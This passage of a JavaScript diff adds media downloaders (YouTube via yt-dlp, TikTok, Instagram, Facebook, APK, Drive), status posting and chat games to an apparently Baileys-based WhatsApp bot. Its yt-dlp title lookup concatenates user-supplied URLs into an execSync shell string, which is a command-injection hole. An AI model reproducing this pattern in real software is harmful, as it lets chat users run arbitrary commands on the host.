+  return null;
+}
+
+// ─── Téléchargement audio via yt-dlp ─────────────────────────────────────────
+async function downloadYouTubeAudioBuffer(videoUrl) {
+  const { execSync, spawnSync } = await import('child_process');
+  const os = await import('os');
+  const pathLib = await import('path');
+  const tmpFile = pathLib.join(os.tmpdir(), 'ytaudio_' + Date.now());
+
+  // ✅ Méthode 1 : yt-dlp (le plus fiable, installé sur le serveur)
+  try {
+    spawnSync('yt-dlp', [
+      videoUrl,
+      '-x', '--audio-format', 'mp3',
+      '--audio-quality', '128K',
+      '-o', tmpFile + '.%(ext)s',
+      '--no-playlist',
+      '--quiet',
+      '--no-warnings',
+      '--socket-timeout', '30'
+    ], { timeout: 120000 });
+    const outFile = tmpFile + '.mp3';
+    if (fs.existsSync(outFile)) {
+      const buf = fs.readFileSync(outFile);
+      fs.unlinkSync(outFile);
+      if (buf.length > 10000) {
+        // Récupérer le titre
+        let title = '';
+        try {
+          title = execSync('yt-dlp "' + videoUrl + '" --print title --no-playlist --quiet', { timeout: 10000, encoding: 'utf8' }).trim();
+        } catch(e) {}
+        return { buf, title };
+      }
+    }
+  } catch(e) { console.log('[YT-DLP AUDIO]', e.message); }
+
+  // ✅ Méthode 2 : APIs externes en fallback
+  const apis = [
+    async () => {
+      const { data } = await axios.get('https://api.giftedtech.co.ke/api/download/savetubemp3?apikey=gifted&url=' + encodeURIComponent(videoUrl), { timeout: 30000 });
+      if (!data?.success || !data?.result?.download_url) throw new Error('indisponible');
+      const dl = await axios.get(data.result.download_url, { responseType: 'arraybuffer', timeout: 120000 });
+      return { buf: Buffer.from(dl.data), title: data?.result?.title };
+    },
+    async () => {
+      const { data } = await axios.post('https://api.cobalt.tools/api/json',
+        { url: videoUrl, isAudioOnly: true, aFormat: 'mp3' },
+        { headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' }, timeout: 20000 }
+      );
+      if (!data?.url) throw new Error('no url');
+      const dl = await axios.get(data.url, { responseType: 'arraybuffer', timeout: 120000 });
+      return { buf: Buffer.from(dl.data), title: null };
+    }
+  ];
+  for (const api of apis) {
+    try {
+      const result = await api();
+      if (result?.buf?.length > 10000) return result;
+    } catch(e) { console.log('[YT AUDIO API]', e.message); }
+  }
+  throw new Error('Téléchargement impossible. Installe yt-dlp sur le serveur: pip install yt-dlp');
+}
+
+// ─── Téléchargement vidéo via yt-dlp ─────────────────────────────────────────
+async function downloadYouTubeVideoBuffer(videoUrl) {
+  const { spawnSync, execSync } = await import('child_process');
+  const os = await import('os');
+  const pathLib = await import('path');
+  const tmpFile = pathLib.join(os.tmpdir(), 'ytvideo_' + Date.now());
+
+  // ✅ yt-dlp
+  try {
+    spawnSync('yt-dlp', [
+      videoUrl,
+      '-f', 'bestvideo[ext=mp4][height<=720]+bestaudio[ext=m4a]/best[ext=mp4][height<=720]/best[height<=720]',
+      '--merge-output-format', 'mp4',
+      '-o', tmpFile + '.%(ext)s',
+      '--no-playlist',
+      '--quiet',
+      '--no-warnings',
+      '--socket-timeout', '30'
+    ], { timeout: 180000 });
+    const outFile = tmpFile + '.mp4';
+    if (fs.existsSync(outFile)) {
+      const buf = fs.readFileSync(outFile);
+      fs.unlinkSync(outFile);
+      if (buf.length > 10000) {
+        let title = '';
+        try { title = execSync('yt-dlp "' + videoUrl + '" --print title --no-playlist --quiet', { timeout: 10000, encoding: 'utf8' }).trim(); } catch(e) {}
+        return { buf, title };
+      }
+    }
+  } catch(e) { console.log('[YT-DLP VIDEO]', e.message); }
+
+  // Fallback APIs
+  try {
+    const { data } = await axios.post('https://api.cobalt.tools/api/json',
+      { url: videoUrl, vCodec: 'h264', vQuality: '720', isAudioOnly: false },
+      { headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' }, timeout: 20000 }
+    );
+    const dlUrl = data?.url || data?.picker?.[0]?.url;
+    if (dlUrl) {
+      const dl = await axios.get(dlUrl, { responseType: 'arraybuffer', timeout: 180000 });
+      return { buf: Buffer.from(dl.data), title: null };
+    }
+  } catch(e) { console.log('[YT VIDEO cobalt]', e.message); }
+
+  throw new Error('Téléchargement impossible. Installe yt-dlp: pip install yt-dlp');
+}
+
+// ─── YOUTUBE AUDIO (MP3) ─────────────────────────────────────────────────────
+async function handleYouTubeAudio(sock, args, remoteJid, senderJid, message) {
+  if (!args.length) return sock.sendMessage(remoteJid, { text: `🎵 Usage: ${config.prefix}ytmp3 <titre ou lien YouTube>` }, { quoted: message });
+  const query = args.join(' ');
+  const loadMsg = await sock.sendMessage(remoteJid, { text: '⏳ *Téléchargement audio en cours...*' }, { quoted: message });
+  try {
+    let videoUrl = query;
+    if (!query.includes('youtube.com') && !query.includes('youtu.be')) {
+      const vid = await searchYouTubeId(query);
+      if (!vid) throw new Error('Vidéo introuvable');
+      videoUrl = `https://www.youtube.com/watch?v=${vid}`;
+    }
+    const { buf, title } = await downloadYouTubeAudioBuffer(videoUrl);
+    await sock.sendMessage(remoteJid, { audio: buf, mimetype: 'audio/mpeg', fileName: `${title || query}.mp3` }, { quoted: message });
+    await sock.sendMessage(remoteJid, { text: `✅ *${title || query}*\n📏 ${(buf.length/1024/1024).toFixed(2)} MB\n© SEIGNEUR TD`, edit: loadMsg.key });
+  } catch(e) {
+    console.error('[YT AUDIO]', e.message);
+    await sock.sendMessage(remoteJid, { text: `❌ Erreur lors du téléchargement audio.\n💡 ${e.message}`, edit: loadMsg.key });
+  }
+}
+
+// ─── YouTube Vidéo ──────────────────────────────────────────────────────────
+async function handleYouTubeVideo(sock, args, remoteJid, senderJid, message) {
+  if (!args.length) return sock.sendMessage(remoteJid, { text: `🎬 Usage: ${config.prefix}playvideo <titre ou lien YouTube>` }, { quoted: message });
+  const query = args.join(' ');
+  const loadMsg = await sock.sendMessage(remoteJid, { text: '⏳ *Téléchargement vidéo en cours...*' }, { quoted: message });
+  try {
+    let videoUrl = query;
+    if (!query.includes('youtube.com') && !query.includes('youtu.be')) {
+      const vid = await searchYouTubeId(query);
+      if (!vid) throw new Error('Vidéo introuvable');
+      videoUrl = `https://www.youtube.com/watch?v=${vid}`;
+    }
+    const { buf, title } = await downloadYouTubeVideoBuffer(videoUrl);
+    await sock.sendMessage(remoteJid, { video: buf, mimetype: 'video/mp4', caption: `✅ *${title || query}*\n📏 ${(buf.length/1024/1024).toFixed(1)} MB\n© SEIGNEUR TD ` }, { quoted: message });
+    await sock.sendMessage(remoteJid, { text: '✅ Vidéo envoyée !', edit: loadMsg.key });
+  } catch(e) {
+    console.error('[YT VIDEO]', e.message);
+    await sock.sendMessage(remoteJid, { text: `❌ Erreur lors du téléchargement vidéo.\n💡 ${e.message}`, edit: loadMsg.key });
+  }
+}
+
+// ─── ytSearch compat ────────────────────────────────────────────────────────
+async function ytSearch(query) {
+  try {
+    const vid = await searchYouTubeId(query);
+    if (!vid) return { status: false };
+    return { status: true, result: { searched_title: query, searched_url: `https://youtu.be/${vid}`, videoId: vid } };
+  } catch { return { status: false }; }
+}
+
+// ─── Play Menu ──────────────────────────────────────────────────────────────
+async function handlePlayMenu(sock, args, remoteJid, senderJid, message) {
+  if (!args.length) return sock.sendMessage(remoteJid, { text: `🎵 Usage: ${config.prefix}play <titre YouTube>` }, { quoted: message });
+  const searchQuery = args.join(' ');
+  try { await sock.sendMessage(remoteJid, { react: { text: '✨', key: message.key } }); } catch(e) {}
+  const loadMsg = await sock.sendMessage(remoteJid, { text: '🔍 *Recherche en cours...*' }, { quoted: message });
+  try {
+    const r = await axios.get('https://api-faa.my.id/faa/ytplayvid', { params: { q: searchQuery }, timeout: 10000 });
+    const res = r.data?.result;
+    if (!res) throw new Error('Vidéo introuvable');
+    const p = config.prefix;
+    await sock.sendMessage(remoteJid, { text: `🎶 *YouTube Player*\n\n📌 *${res.title || searchQuery}*\n🔗 https://youtu.be/${res.videoId}`, edit: loadMsg.key });
+    await sock.sendMessage(remoteJid, {
+      text: '🎵 *Choisis le format :*',
+      footer: '© SEIGNEUR TD',
+      buttons: [{
+        buttonId: 'play_format',
+        buttonText: { displayText: '🎵 Audio / 🎬 Vidéo / 🎤 PTT' },
+        type: 4,
+        nativeFlowInfo: {
+          name: 'single_select',
+          paramsJson: JSON.stringify({
+            title: '🎵 Téléchargement YouTube',
+            sections: [{ title: `📌 ${res.title || searchQuery}`, rows: [
+              { header: '🎵', title: 'Audio MP3', description: 'Télécharger en MP3', id: `${p}playaudio ${searchQuery}` },
+              { header: '🎬', title: 'Vidéo MP4', description: 'Télécharger en MP4', id: `${p}playvideo ${searchQuery}` },
+              { header: '🎤', title: 'Voice PTT', description: 'Message vocal WhatsApp', id: `${p}playptt ${searchQuery}` }
+            ]}]
+          })
+        }
+      }],
+      headerType: 1, viewOnce: true
+    }).catch(() => {});
+  } catch(e) {
+    console.error('[PLAY MENU]', e.message);
+    await sock.sendMessage(remoteJid, { text: `❌ Erreur: ${e.message}`, edit: loadMsg.key });
+  }
+}
+
+// ─── Play Audio (alias) ─────────────────────────────────────────────────────
+async function handlePlayAudio(sock, args, remoteJid, senderJid, message) {
+  return handleYouTubeAudio(sock, args, remoteJid, senderJid, message);
+}
+
+// ─── Play Video (alias) ─────────────────────────────────────────────────────
+async function handlePlayVideo(sock, args, remoteJid, senderJid, message) {
+  return handleYouTubeVideo(sock, args, remoteJid, senderJid, message);
+}
+
+// ─── Play PTT ───────────────────────────────────────────────────────────────
+async function handlePlayPTT(sock, args, remoteJid, senderJid, message) {
+  if (!args.length) return sock.sendMessage(remoteJid, { text: `🎤 Usage: ${config.prefix}playptt <titre>` }, { quoted: message });
+  const query = args.join(' ');
+  const loadMsg = await sock.sendMessage(remoteJid, { text: '⏳ *Téléchargement PTT en cours...*' }, { quoted: message });
+  try {
+    const r = await axios.get('https://api-faa.my.id/faa/ytplayvid', { params: { q: query }, timeout: 10000 });
+    const vid = r.data?.result?.videoId;
+    if (!vid) throw new Error('Vidéo introuvable');
+    const { data } = await axios.get(`https://api.giftedtech.co.ke/api/download/savetubemp3?apikey=gifted&url=${encodeURIComponent(`https://www.youtube.com/watch?v=${vid}`)}`, { timeout: 30000 });
+    if (!data?.success || !data?.result?.download_url) throw new Error('API indisponible');
+    const dlRes = await axios.get(data.result.download_url, { responseType: 'arraybuffer', timeout: 90000 });
+    await sock.sendMessage(remoteJid, { audio: Buffer.from(dlRes.data), mimetype: 'audio/ogg; codecs=opus', ptt: true }, { quoted: message });
+    await sock.sendMessage(remoteJid, { text: '✅ PTT envoyé !', edit: loadMsg.key });
+  } catch(e) {
+    await sock.sendMessage(remoteJid, { text: `❌ Erreur: ${e.message}`, edit: loadMsg.key });
+  }
+}
+
+// ─── TikTok ─────────────────────────────────────────────────────────────────
+async function handleTikTok(sock, args, remoteJid, senderJid, message) {
+  const url = (args[0] || '').trim();
+  if (!url || !/^https?:\/\//i.test(url)) return sock.sendMessage(remoteJid, { text: `❗ Usage: ${config.prefix}tiktok <url>` }, { quoted: message });
+  const loadMsg = await sock.sendMessage(remoteJid, { text: '⏳ *Téléchargement TikTok en cours...*' }, { quoted: message });
+  try {
+    const { data } = await axios.get(`https://api.giftedtech.co.ke/api/download/tiktok?apikey=gifted&url=${encodeURIComponent(url)}`, { timeout: 30000 });
+    if (!data?.success || !data?.result) throw new Error('API indisponible');
+    const result = data.result;
+    const dlUrl = result.video_nowm || result.video_hd || result.video_sd || result.download_url;
+    if (!dlUrl) throw new Error('Aucune vidéo trouvée');
+    const dlRes = await axios.get(dlUrl, { responseType: 'arraybuffer', timeout: 90000 });
+    const buf = Buffer.from(dlRes.data);
+    await sock.sendMessage(remoteJid, {
+      video: buf, mimetype: 'video/mp4',
+      caption: `✅ *TikTok téléchargé !*\n👤 ${result.author || result.username || 'TikTok'}\n📏 ${(buf.length/1024/1024).toFixed(1)} MB\n© SEIGNEUR TD `
+    }, { quoted: message });
+    await sock.sendMessage(remoteJid, { text: '✅ TikTok envoyé !', edit: loadMsg.key });
+  } catch(e) {
+    console.error('[TIKTOK]', e.message);
+    await sock.sendMessage(remoteJid, { text: `❌ Erreur: ${e.message}`, edit: loadMsg.key });
+  }
+}
+
+// ─── Instagram ──────────────────────────────────────────────────────────────
+async function handleInstagram(sock, args, remoteJid, senderJid, message) {
+  const url = (args[0] || '').trim();
+  if (!url || !/^https?:\/\//i.test(url)) return sock.sendMessage(remoteJid, { text: `❗ Usage: ${config.prefix}ig <url Instagram>` }, { quoted: message });
+  const loadMsg = await sock.sendMessage(remoteJid, { text: '⏳ *Téléchargement Instagram en cours...*' }, { quoted: message });
+  try {
+    const { data } = await axios.get(`https://api.giftedtech.co.ke/api/download/instadl?apikey=gifted&url=${encodeURIComponent(url)}`, { timeout: 30000 });
+    if (!data?.success || !data?.result) throw new Error('API indisponible');
+    const medias = Array.isArray(data.result) ? data.result : [data.result];
+    let sent = 0;
+    for (const media of medias.slice(0, 5)) {
+      const dlUrl = media.url || media.download_url || media.video || media.image;
+      if (!dlUrl) continue;
+      const dlRes = await axios.get(dlUrl, { responseType: 'arraybuffer', timeout: 60000 });
+      const buf = Buffer.from(dlRes.data);
+      const isVideo = media.type === 'video' || String(dlUrl).includes('.mp4');
+      if (isVideo) {
+        await sock.sendMessage(remoteJid, { video: buf, mimetype: 'video/mp4', caption: `🎥 Instagram` }, { quoted: message });
+      } else {
+        await sock.sendMessage(remoteJid, { image: buf, caption: `🖼️ Instagram` }, { quoted: message });
+      }
+      sent++;
+    }
+    if (!sent) throw new Error('Aucun média trouvé');
+    await sock.sendMessage(remoteJid, { text: `✅ ${sent} média(s) envoyé(s) !`, edit: loadMsg.key });
+  } catch(e) {
+    console.error('[INSTAGRAM]', e.message);
+    await sock.sendMessage(remoteJid, { text: `❌ Erreur: ${e.message}`, edit: loadMsg.key });
+  }
+}
+
+// ─── Facebook ───────────────────────────────────────────────────────────────
+async function handleFacebook(sock, args, remoteJid, senderJid, message) {
+  const url = (args[0] || '').trim();
+  if (!url || !/^https?:\/\//i.test(url)) return sock.sendMessage(remoteJid, { text: `❗ Usage: ${config.prefix}fb <url Facebook>` }, { quoted: message });
+  const loadMsg = await sock.sendMessage(remoteJid, { text: '⏳ *Téléchargement Facebook en cours...*' }, { quoted: message });
+  try {
+    const { data } = await axios.get(`https://api.giftedtech.co.ke/api/download/facebook?apikey=gifted&url=${encodeURIComponent(url)}`, { timeout: 30000 });
+    if (!data?.success || !data?.result) throw new Error('API indisponible');
+    const result = data.result;
+    const dlUrl = result.hd || result.sd || result.download_url;
+    if (!dlUrl) throw new Error('Aucune vidéo trouvée');
+    const dlRes = await axios.get(dlUrl, { responseType: 'arraybuffer', timeout: 120000 });
+    const buf = Buffer.from(dlRes.data);
+    await sock.sendMessage(remoteJid, {
+      video: buf, mimetype: 'video/mp4',
+      caption: `✅ *Facebook téléchargé !*\n📏 ${(buf.length/1024/1024).toFixed(1)} MB\n© SEIGNEUR TD `
+    }, { quoted: message });
+    await sock.sendMessage(remoteJid, { text: '✅ Facebook envoyé !', edit: loadMsg.key });
+  } catch(e) {
+    console.error('[FACEBOOK]', e.message);
+    await sock.sendMessage(remoteJid, { text: `❌ Erreur: ${e.message}`, edit: loadMsg.key });
+  }
+}
+
+// ─── APK ────────────────────────────────────────────────────────────────────
+async function handleAPK(sock, args, remoteJid, senderJid, message) {
+  const appName = args.join(' ').trim();
+  if (!appName) return sock.sendMessage(remoteJid, { text: `❗ Usage: ${config.prefix}apk <nom app>\nEx: ${config.prefix}apk WhatsApp` }, { quoted: message });
+  const loadMsg = await sock.sendMessage(remoteJid, { text: `⏳ *Recherche APK: ${appName}...*` }, { quoted: message });
+  try {
+    const { data } = await axios.get(`https://api.giftedtech.co.ke/api/download/apkdl?apikey=gifted&appName=${encodeURIComponent(appName)}`, { timeout: 30000 });
+    if (!data?.success || !data?.result) throw new Error('APK introuvable');
+    const r = data.result;
+    const caption = `📱 *${r.name || appName}*\n\n⭐ Note: ${r.rating || 'N/A'}\n🔖 Version: ${r.version || 'N/A'}\n📦 Taille: ${r.size || 'N/A'}\n🔗 ${r.download_url || r.url || 'N/A'}\n\n© SEIGNEUR TD `;
+    if (r.icon) {
+      try {
+        const iconRes = await axios.get(r.icon, { responseType: 'arraybuffer', timeout: 15000 });
+        await sock.sendMessage(remoteJid, { image: Buffer.from(iconRes.data), caption }, { quoted: message });
+      } catch { await sock.sendMessage(remoteJid, { text: caption }, { quoted: message }); }
+    } else {
+      await sock.sendMessage(remoteJid, { text: caption }, { quoted: message });
+    }
+    await sock.sendMessage(remoteJid, { text: '✅ APK trouvé !', edit: loadMsg.key });
+  } catch(e) {
+    console.error('[APK]', e.message);
+    await sock.sendMessage(remoteJid, { text: `❌ Erreur: ${e.message}`, edit: loadMsg.key });
+  }
+}
+
+// ─── Google Drive ───────────────────────────────────────────────────────────
+async function handleGDrive(sock, args, remoteJid, senderJid, message) {
+  const url = (args[0] || '').trim();
+  if (!url || !/^https?:\/\//i.test(url)) return sock.sendMessage(remoteJid, { text: `❗ Usage: ${config.prefix}gdrive <url Drive>` }, { quoted: message });
+  const loadMsg = await sock.sendMessage(remoteJid, { text: '⏳ *Récupération Google Drive...*' }, { quoted: message });
+  try {
+    const { data } = await axios.get(`https://api.giftedtech.co.ke/api/download/gdrivedl?apikey=gifted&url=${encodeURIComponent(url)}`, { timeout: 30000 });
+    if (!data?.success || !data?.result) throw new Error('API indisponible');
+    const r = data.result;
+    const dlUrl = r.download_url || r.url;
+    if (!dlUrl) throw new Error('Aucun lien trouvé');
+    await sock.sendMessage(remoteJid, {
+      text: `✅ *Google Drive*\n📄 ${r.name || 'Fichier'}\n📏 ${r.size || 'N/A'}\n🔗 ${dlUrl}\n\n© SEIGNEUR TD `
+    }, { quoted: message });
+    await sock.sendMessage(remoteJid, { text: '✅ Lien envoyé !', edit: loadMsg.key });
+  } catch(e) {
+    console.error('[GDRIVE]', e.message);
+    await sock.sendMessage(remoteJid, { text: `❌ Erreur: ${e.message}`, edit: loadMsg.key });
+  }
+}
+
+// ─── Mediafire ──────────────────────────────────────────────────────────────
+async function handleMediafire(sock, args, remoteJid, senderJid, message) {
+  const url = (args[0] || '').trim();
+  if (!url || !/^https?:\/\//i.test(url)) return sock.sendMessage(remoteJid, { text: `❗ Usage: ${config.prefix}mediafire <url Mediafire>` }, { quoted: message });
+  const loadMsg = await sock.sendMessage(remoteJid, { text: '⏳ *Récupération Mediafire...*' }, { quoted: message });
+  try {
+    const { data } = await axios.get(`https://api.giftedtech.co.ke/api/download/mediafire?apikey=gifted&url=${encodeURIComponent(url)}`, { timeout: 30000 });
+    if (!data?.success || !data?.result) throw new Error('API indisponible');
+    const r = data.result;
+    const dlUrl = r.download_url || r.url;
+    if (!dlUrl) throw new Error('Aucun lien trouvé');
+    await sock.sendMessage(remoteJid, {
+      text: `✅ *Mediafire*\n📄 ${r.name || r.filename || 'Fichier'}\n📏 ${r.size || 'N/A'}\n🔗 ${dlUrl}\n\n© SEIGNEUR TD `
+    }, { quoted: message });
+    await sock.sendMessage(remoteJid, { text: '✅ Lien envoyé !', edit: loadMsg.key });
+  } catch(e) {
+    console.error('[MEDIAFIRE]', e.message);
+    await sock.sendMessage(remoteJid, { text: `❌ Erreur: ${e.message}`, edit: loadMsg.key });
+  }
+}
+
+async function handleToStatus(sock, args, message, remoteJid, senderJid) {
+  try {
+    const quotedMsg = message.message?.extendedTextMessage?.contextInfo?.quotedMessage;
+    const text = args.join(' ');
+
+    // Statut texte
+    if (!quotedMsg && text) {
+      const colors = ['#FF5733','#33FF57','#3357FF','#FF33A8','#FFD700','#00CED1'];
+      const bgColor = colors[Math.floor(Math.random() * colors.length)];
+      await sock.sendMessage('status@broadcast', {
+        text: text,
+        backgroundColor: bgColor,
+        font: Math.floor(Math.random() * 5),
+        statusJidList: [senderJid]
+      });
+      await sock.sendMessage(remoteJid, {
+        text: `✅ *Text status posted!*\n\n📝 "${text}"\n🎨 Couleur: ${bgColor}`
+      });
+      return;
+    }
+
+    // Statut image (répondre à une image)
+    if (quotedMsg?.imageMessage) {
+      const imgData = quotedMsg.imageMessage;
+      const stream = await downloadContentFromMessage(imgData, 'image');
+      const chunks = [];
+      for await (const chunk of stream) chunks.push(chunk);
+      const buffer = Buffer.concat(chunks);
+      const caption = text || imgData.caption || '';
+
+      await sock.sendMessage('status@broadcast', {
+        image: buffer,
+        caption: caption,
+        statusJidList: [senderJid]
+      });
+      await sock.sendMessage(remoteJid, {
+        text: `✅ *Image status posted!*\n📝 Caption: ${caption || '(none)'}`
+      });
+      return;
+    }
+
+    // Statut vidéo (répondre à une vidéo)
+    if (quotedMsg?.videoMessage) {
+      const vidData = quotedMsg.videoMessage;
+      const stream = await downloadContentFromMessage(vidData, 'video');
+      const chunks = [];
+      for await (const chunk of stream) chunks.push(chunk);
+      const buffer = Buffer.concat(chunks);
+
+      await sock.sendMessage('status@broadcast', {
+        video: buffer,
+        caption: text || '',
+        statusJidList: [senderJid]
+      });
+      await sock.sendMessage(remoteJid, {
+        text: `✅ *Video status posted!*`
+      });
+      return;
+    }
+
+    await sock.sendMessage(remoteJid, {
+      text: `📊 *ToStatus - Post a status*\n\nUsage:\n• ${config.prefix}tostatus [texte] → text status\n• Reply to an image + ${config.prefix}tostatus → image status\n• Réponds à une vidéo + ${config.prefix}tostatus → video status`
+    });
+  } catch(e) {
+    console.error(' tostatus:', e);
+    await sock.sendMessage(remoteJid, { text: `❌ Error: ${e.message}` });
+  }
+}
+
+// !groupstatus — Post a status dans le groupe (épingler message)
+async function handleGroupStatus(sock, args, message, remoteJid, senderJid, isGroup) {
+  if (!isGroup) {
+    await sock.sendMessage(remoteJid, { text: '❌ Group-only command!' });
+    return;
+  }
+  const text = args.join(' ');
+  if (!text) {
+    await sock.sendMessage(remoteJid, {
+      text: `📢 *GroupStatus*\n\nUsage: ${config.prefix}groupstatus [message]\n\nEnvoie un formatted pinned message in the group.`
+    });
+    return;
+  }
+
+  const now = new Date().toLocaleString('fr-FR', { timeZone: 'America/Port-au-Prince' });
+  try {
+    const statusMsg = await sock.sendMessage(remoteJid, {
+      text: `📌 *GROUP STATUS*\n━━━━━━━━━━━━━━━━━━━━━━━\n\n${text}\n\n━━━━━━━━━━━━━━━━━━━━━━━\n🕐 ${now}\n✍️ Par: @${senderJid.split('@')[0]}`,
+      mentions: [senderJid]
+    });
+    // Épingler le message
+    try {
+      await sock.sendMessage(remoteJid, {
+        pin: { type: 1, time: 604800 }, // 7 jours
+        key: statusMsg.key
+      });
+    } catch(e) { /* silencieux si pas admin */ }
+  } catch(e) {
+    await sock.sendMessage(remoteJid, { text: `❌ Error: ${e.message}` });
+  }
+}
+
+// =============================================
+// 🎮 SYSTÈME DE JEUX
+// =============================================
+
+// ─── État global des jeux ─────────────────────────────────────────────────
+const gameState = new Map(); // remoteJid → { type, data }
+
+// ─── Dispatcher réactions jeux ────────────────────────────────────────────
+async function handleGameReaction(sock, message, messageText, remoteJid, senderJid) {
+  const state = gameState.get(remoteJid);
+  if (!state) return;
+
+  if (state.type === 'tictactoe') {
+    await processTTTMove(sock, message, messageText, remoteJid, senderJid, state);
+  } else if (state.type === 'quiz') {
+    await processQuizAnswer(sock, message, messageText, remoteJid, senderJid, state);
+  } else if (state.type === 'squidgame') {
+    await processSquidReaction(sock, message, messageText, remoteJid, senderJid, state);
+  }
+}
+
+// =============================================
+// ❌⭕ TIC-TAC-TOE
+// =============================================
+const TTT_EMPTY = '⬜';
+const TTT_X     = '❌';
+const TTT_O     = '⭕';
+
+function renderTTTBoard(board) {
+  return board.reduce((str, cell, i) => str + cell + (i % 3 === 2 ? '\n' : ''), '');
+}
+
+function checkTTTWin(board, mark) {
+  const wins = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];
+  return wins.some(([a,b,c]) => board[a]===mark && board[b]===mark && board[c]===mark);
+}
+
+async function handleTicTacToe(sock, args, message, remoteJid, senderJid, isGroup) {
+  const existing = gameState.get(remoteJid);
+
+  // Si partie en cours
+  if (existing?.type === 'tictactoe') {
+    await sock.sendMessage(remoteJid, {
+      text: `⚠️ A TicTacToe game is already in progress!\n\n${renderTTTBoard(existing.data.board)}\nType a number *1-9* to play.\n\n_${config.prefix}ttt stop → abandon_`
+    });
+    return;
+  }
+
+  // Stop la partie
+  if (args[0] === 'stop') {
+    gameState.delete(remoteJid);
+    await sock.sendMessage(remoteJid, { text: '🛑 TicTacToe game abandoned.' });
+    return;
+  }
+
+  // Démarrer
+  const player1 = senderJid;
+  const player2 = message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
+
+  if (!player2) {
+    await sock.sendMessage(remoteJid, {
+      text: `❌⭕ *TIC-TAC-TOE*\n\nUsage: ${config.prefix}tictactoe @adversaire\n\nMention a player to start!\n\nDuring the game, type a number:\n1️⃣2️⃣3️⃣\n4️⃣5️⃣6️⃣\n7️⃣8️⃣9️⃣`,
+      mentions: []
+    });
+    return;
+  }
+
+  const board = Array(9).fill(TTT_EMPTY);
+  gameState.set(remoteJid, {
+    type: 'tictactoe',
+    data: {
+      board,
+      players: [player1, player2],
+      marks:   [TTT_X, TTT_O],
+      turn: 0,
+      startTime: Date.now()
+    }
+  });
+
+  await sock.sendMessage(remoteJid, {
+    text: `❌⭕ *TIC-TAC-TOE COMMENCE!*\n\n` +
+      `👤 Joueur 1: @${player1.split('@')[0]} → ❌\n` +
+      `👤 Joueur 2: @${player2.split('@')[0]} → ⭕\n\n` +
+      `${renderTTTBoard(board)}\n` +
+      `*Position:*\n1️⃣2️⃣3️⃣\n4️⃣5️⃣6️⃣\n7️⃣8️⃣9️⃣\n\n` +
+      `@${player1.split('@')[0]} → Your turn! Send a number 1-9`,
+    mentions: [player1, player2]
+  });
+}
+
+async function processTTTMove(sock, message, text, remoteJid, senderJid, state) {
+  const { board, players, marks, turn } = state.data;
+  const currentPlayer = players[turn];
+  const currentMark   = marks[turn];
+
+  if (senderJid !== currentPlayer) return; // Pas ton tour
+
+  const pos = parseInt(text.trim()) - 1;
+  if (isNaN(pos) || pos < 0 || pos > 8) return;
+  if (board[pos] !== TTT_EMPTY) {
+    await sock.sendMessage(remoteJid, { text: '⚠️ That cell is already taken!' });
+    return;
+  }
+
+  board[pos] = currentMark;
+
+  if (checkTTTWin(board, currentMark)) {
+    gameState.delete(remoteJid);
+    await sock.sendMessage(remoteJid, {
+      text: `${renderTTTBoard(board)}\n\n🏆 *@${currentPlayer.split('@')[0]} GAGNE!* ${currentMark}\n\nFélicitations! 🎉`,
+      mentions: [currentPlayer]
+    });
+    return;
+  }
+
+  if (board.every(c => c !== TTT_EMPTY)) {
+    gameState.delete(remoteJid);
+    await sock.sendMessage(remoteJid, {
+      text: `${renderTTTBoard(board)}\n\n🤝 *DRAW!*\nGood game to both of you!`
+    });
+    return;
+  }
+
+  const nextTurn = turn === 0 ? 1 : 0;
+  state.data.turn = nextTurn;
+  const nextPlayer = players[nextTurn];
+
+  await sock.sendMessage(remoteJid, {
+    text: `${renderTTTBoard(board)}\n\n@${nextPlayer.split('@')[0]} → Your turn! Send a number 1-9`,
+    mentions: [nextPlayer]
+  });
+}
+
+// =============================================
+// 🍥 QUIZ MANGA
+// =============================================
+const QUIZ_MANGA = [
+  { q: '🍥 Dans quel anime le personnage Naruto Uzumaki est-il le héros principal?', a: 'naruto', hint: 'C\'est le titre de l\'anime!' },
+  { q: '⚔️ Quel est le pouvoir signature de Goku dans Dragon Ball?', a: 'kamehameha', hint: 'K-A-M-E...' },
+  { q: '👁️ Comment s\'appelle le pouvoir oculaire de Sasuke?', a: 'sharingan', hint: 'Commence par S' },
+  { q: '💀 Dans One Piece, comment s\'appelle le chapeau de paille emblématique de Luffy?', a: 'chapeau de paille', hint: 'C\'est son surnom!' },
+  { q: '🗡️ Dans Demon Slayer, quel est le style de respiration principal de Tanjiro?', a: 'eau', hint: 'Un élément liquide' },
+  { q: '⚡ Dans Attack on Titan, comment s\'appelle le titan colossal de Bertholdt?', a: 'titan colossal', hint: 'Il est très grand' },
+  { q: '🏴‍☠️ Quel est le vrai nom de Zoro dans One Piece?', a: 'roronoa zoro', hint: 'Son nom de famille commence par R' },
+  { q: '🔮 Dans Hunter x Hunter, comment s\'appelle l\'énergie vitale que les personnages utilisent?', a: 'nen', hint: '3 lettres' },
+  { q: '🌊 Dans My Hero Academia, quel est le Quirk de Midoriya?', a: 'one for all', hint: 'Héritage de All Might' },
+  { q: '🌙 Dans Bleach, comment s\'appelle l\'épée spirituelle d\'Ichigo?', a: 'zangetsu', hint: 'Tranche la lune' },
+  { q: '🔥 Quel anime suit Tanjiro Kamado chassant des démons pour sauver sa sœur?', a: 'demon slayer', hint: 'Kimetsu no Yaiba' },
+  { q: '💥 Dans One Punch Man, pourquoi Saitama est-il devenu chauve?', a: 'entrainement', hint: 'Il a trop...' },
+  { q: '🃏 Dans Death Note, quel est le nom du carnet magique?', a: 'death note', hint: 'Le titre de l\'anime!' },
+  { q: '🐉 Dans Fairy Tail, quel est le pouvoir de Natsu Dragneel?', a: 'flamme', hint: 'Très chaud!' },
+  { q: '⚙️ Dans Fullmetal Alchemist, quels sont les frères Elric?', a: 'edward et alphonse', hint: 'Ed et Al' },
+];
+
+async function handleQuizManga(sock, args, message, remoteJid, senderJid, isGroup) {
+  const existing = gameState.get(remoteJid);
+
+  // Stop
+  if (args[0] === 'stop') {
+    if (existing?.type === 'quiz') {
+      gameState.delete(remoteJid);
+      await sock.sendMessage(remoteJid, { text: '🛑 Quiz arrêté!\n\n📊 *Score final:*\n' + formatQuizScores(existing.data.scores) });
+    } else {
+      await sock.sendMessage(remoteJid, { text: '❌ No quiz in progress.' });
+    }
+    return;
+  }
+
+  // Partie déjà en cours
+  if (existing?.type === 'quiz') {
+    await sock.sendMessage(remoteJid, {
